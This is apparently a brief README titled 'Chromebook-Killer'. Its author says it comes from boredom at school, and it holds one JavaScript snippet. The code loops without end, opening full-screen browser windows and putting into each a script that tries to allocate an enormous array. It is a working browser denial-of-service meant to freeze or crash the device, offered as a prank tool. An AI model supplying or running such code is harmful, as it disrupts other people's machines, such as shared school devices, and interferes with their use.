# Chromebook-Killer
I was bored in school. Nothing new there.

```js
for(;;){
  var a = Math.floor(100*Math.random()+1);
  b = window.open("_blank","Lag"+a,`height=${screen.height},width=${screen.width}`);
  b.document.body.innerHTML="<script>[...Array(2**32-1)]</script>";
}
```
